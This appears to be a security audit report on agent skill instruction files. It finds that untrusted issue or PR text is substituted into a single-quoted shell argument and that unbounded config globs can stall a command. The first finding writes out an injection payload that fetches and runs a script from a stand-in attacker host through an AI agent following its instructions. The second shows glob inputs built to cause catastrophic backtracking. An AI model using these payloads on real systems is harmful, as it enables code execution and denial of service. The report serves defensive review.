### [F-001] The r02 task-text quoting fix reached one of five instruction sites; four still tell the agent to wrap untrusted text in single quotes with no rule for an embedded `'`
- **Severity**: major
- **File**: src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md (managed copy `.metaproject/skills/gdskills/orchestration/task-implementer/SKILL.md`, byte-identical)
- **Attack vector**: A third party who controls the text of an issue or PR that is decomposed into a task (the `task.description` that issue-analyzer produces) writes `x'; curl https://evil.example/p.sh | sh; echo '`. The executing agent follows the instruction literally and substitutes it into `--task-text '<task.description>'`. The single quote closes the argument and the rest runs in the agent's Bash shell, with the repo checkout and its credentials. An ordinary apostrophe ("don't", "user's") breaks the command the same way, so the failure also happens without an attacker.
- **Problem**: Commit 4838b1b40 moved the examples from double quotes (where a backtick or `$(...)` in the description would execute) to single quotes, and wrote the escaping rule only in flow-orchestrator: "Write the text single-quoted (a `'` inside it becomes `'\''`): double quotes let the shell run any backtick or `$(...)`". The other four instruction sites carry the single-quote form and no escape rule. A single-quoted example without the `'\''` rule is safe only for text with no apostrophe.
- **Why it matters**: The text that reaches the shell is task text from issues and PR descriptions, which outsiders can write. The harness and MCP path (`task_text` field) and the CLI argv path do not shell out, so the exposure is limited to these skill instructions, but they are what the agent executes. Reaching code execution needs the model to copy the string verbatim, so this is a plausible but model-dependent path, not a deterministic one.
- **Fix**: Either put the same sentence as flow-orchestrator:323 at every site, or remove the shell from the path. The second is better: have the agent write the text to a file inside the workspace and pass `--task-text-file <path>`, or read `--task-text` from stdin (`--task-text -`), so no quoting rule is needed. If the quoting rule stays, add a contract test over all bundled skill files that fails when a `--task-text '` example appears without the `'\''` rule, so a sixth site cannot be added silently.
- **quote**: `--task-text '<task.description>' --out <project-relative path>`
- **class_scope**:
  - sites: `src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182`, `src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93`, `src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:749`, `src/gdskills/bundled/skills/orchestration/job-orchestrator/SKILL.md:1307`, `src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:132`, `src/gdskills/bundled/skills/orchestration/job-orchestrator/orchestrator-prompt.md:188`; the byte-identical managed copies under `.metaproject/skills/gdskills/` at the same lines. Correct (carries the escape rule): `src/gdskills/bundled/skills/orchestration/flow-orchestrator/SKILL.md:323`.
  - enumeration_method: `keryx ctx rg -n --all "task-text" src/gdskills/bundled/skills` returned 7 matches in 5 files; `keryx ctx rg -n --all -e "single-quoted" -e "inside it becomes" src/gdskills/bundled/skills` shows the escape rule only at flow-orchestrator:323 (the other "single-quoted" hits are the unrelated `set -- <path...>` lines).

### [F-002] Declared globs go into a regex built from `**` and into a brace expander with no bound on either
- **Severity**: minor
- **File**: src/gdskills/reference-entries.ts:58 (calls `src/lib/glob.ts`, unchanged by this PR)
- **Attack vector**: Someone who can change `.metaproject/rules/project/references.json` in a PR (a fork PR, for instance) adds `"globs": ["**/**/**/**/**/**/**/zzz"]` or twelve or more chained `{a,b}` groups. When a maintainer or CI runs `keryx skills resolve-context` or `keryx skills references check` on the checked-out branch, `globToRegExp` turns each `**` into `.*` (so seven of them backtrack polynomially against every task file path that does not match), and `expandBraces` produces 2^n globs, each compiled to a regex. The command stalls or runs out of memory.
- **Problem**: `references-config.ts` validates that each glob is a non-empty string and nothing else. This PR is the first place a glob from a file that is meant to be edited per project is fed to `matchesAnyGlobWithBraces`; the same function already serves rule front-matter globs, which have the same shape of exposure.
- **Why it matters**: Denial of service on a reviewer's machine or a CI job from a config file in the PR. No data is exposed and the attacker needs write access to a proposed change, hence minor, defence in depth.
- **Fix**: In `parseWhen`, cap the number of globs per entry, the length of a glob, the number of `**` per glob and the number of `{`, and reject a glob over the cap with a message that names the entry. In `globToRegExp`, collapse consecutive `**` into one `.*`.
- **quote**: `const glob = declaration.when.globs.find((candidate) => files.some((file) => matchesAnyGlobWithBraces(file, [candidate])));`

- MCP and harness `task_text` (`mcp/metaproject-tools.ts`, `metaproject-operations.ts`, `metaproject-adapter.ts`): passed as a value, truncated by `truncateTaskText`, matched only through `keywordOccurs`. No shell, no SQL, no path use.
